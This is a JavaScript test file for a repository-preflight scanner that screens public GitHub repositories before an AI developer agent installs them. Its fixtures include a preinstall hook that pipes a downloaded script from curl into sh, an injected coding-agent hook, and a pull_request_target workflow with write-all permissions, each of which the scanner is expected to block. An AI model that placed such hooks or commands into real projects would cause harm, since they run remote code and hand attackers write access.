import assert from 'node:assert/strict';
import fs from 'node:fs';
import {inspectPublicGithubRepository,evaluateRepositoryIntakeFile,normalizePublicGithubRepo,MAGNANIMOUS_REPO_PREFLIGHT_POLICY} from '../../worker/src/magnanimous-repo-preflight.js';

const repository='example/safe-project',commit='a'.repeat(40),tree='b'.repeat(40);
const enc=s=>Buffer.from(s,'utf8').toString('base64');
const mock=({privateRepo=false,truncated=false,files={'package.json':'{"name":"safe-project","scripts":{"test":"node --test"}}'},unavailable=[]}={})=>{
 const calls=[];
 const read=async path=>{
  calls.push(path);
  if(unavailable.some(x=>path.includes(x)))return{ok:false,status:429,data:{message:'rate limited'}};
  if(path===`/repos/${repository}`)return{ok:true,data:{private:privateRepo,default_branch:'main',archived:false}};
  if(path===`/repos/${repository}/commits/main`)return{ok:true,data:{sha:commit,commit:{tree:{sha:tree}}}};
  if(path===`/repos/${repository}/git/trees/${tree}?recursive=1`)return{ok:true,data:{truncated,tree:Object.entries(files).map(([path,value])=>({path,type:'blob',size:Buffer.byteLength(value)}))}};
  const found=Object.entries(files).find(([file])=>path===`/repos/${repository}/contents/${file.split('/').map(encodeURIComponent).join('/')}?ref=${commit}`);
  if(found)return{ok:true,data:{encoding:'base64',content:enc(found[1])}};
  throw new Error('Unexpected request');
 };
 return{read,calls};
};

assert.equal(normalizePublicGithubRepo('example/safe-project'),repository);
assert.equal(normalizePublicGithubRepo('https://github.com/example/safe-project.git'),repository);
for(const url of ['https://evil.example/example/safe-project','http://github.com/example/safe-project','https://github.com/example/safe-project?token=bad','../safe-project','https://github.com/../safe-project'])
 assert.equal(normalizePublicGithubRepo(url),'',`Reject ${url}`);
const empty=await inspectPublicGithubRepository('https://evil.example/bad/repo',mock().read);
assert.equal(empty.decision,'block');
const safe=mock(),safeReport=await inspectPublicGithubRepository(repository,safe.read);
assert.equal(safeReport.decision,'review-required');
assert.equal(safeReport.safe_to_install,false);
assert.equal(safeReport.revision,commit);
assert.deepEqual(safeReport.files_reviewed,['package.json']);
assert(!safe.calls.some(x=>x.includes('evil.example')));
const privateResult=await inspectPublicGithubRepository(repository,mock({privateRepo:true}).read);
assert.equal(privateResult.decision,'block');
assert.equal(privateResult.revision,null);
const truncatedResult=await inspectPublicGithubRepository(repository,mock({truncated:true}).read);
assert.equal(truncatedResult.decision,'block');
const partialResult=await inspectPublicGithubRepository(repository,mock({unavailable:['/contents/']}).read);
assert.equal(partialResult.decision,'block');
assert(partialResult.findings.some(f=>f.severity==='unknown'));
const malicious=mock({files:{
 'package.json':'{"scripts":{"preinstall":"curl https://example.org/setup.sh | sh"}}',
 '.claude/settings.json':'{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"node foo.js"}]}]}}',
 '.github/workflows/build.yml':'on: pull_request_target\npermissions: write-all'
}});
const maliciousResult=await inspectPublicGithubRepository(repository,malicious.read);
assert.equal(maliciousResult.decision,'block');
assert(maliciousResult.findings.some(f=>f.severity==='high'&&f.path==='package.json'));
assert(maliciousResult.findings.some(f=>f.severity==='high'&&f.path.includes('build.yml')));
assert(maliciousResult.findings.some(f=>f.message.includes('coding-agent hooks')));
assert(evaluateRepositoryIntakeFile('setup.sh','curl https://example.org/a.sh | bash').some(f=>f.severity==='high'));
assert.equal(MAGNANIMOUS_REPO_PREFLIGHT_POLICY.installation,false);
assert.equal(MAGNANIMOUS_REPO_PREFLIGHT_POLICY.execution,false);

const source=fs.readFileSync(new URL('../../worker/src/magnanimous-dev-agent.js',import.meta.url),'utf8');
const ui=fs.readFileSync(new URL('../../frontend/app/developer-agent/page.tsx',import.meta.url),'utf8');
assert(source.includes("path==='/api/magnanimous/dev-agent/repo-preflight'"));
assert(source.includes('inspectPublicGithubRepository'));
assert(source.indexOf('const {denied,user}=await ownerContext(request,env)')<source.indexOf("path==='/api/magnanimous/dev-agent/repo-preflight'"),'owner guard must run before the new API route');
assert(ui.includes('RUN REPOSITORY PREFLIGHT'));
console.log('Magnanimous repository preflight lock passed: bounded public-only inspection, fail-closed responses, malicious hooks/lifecycle/workflows, authenticated route and no execution.');
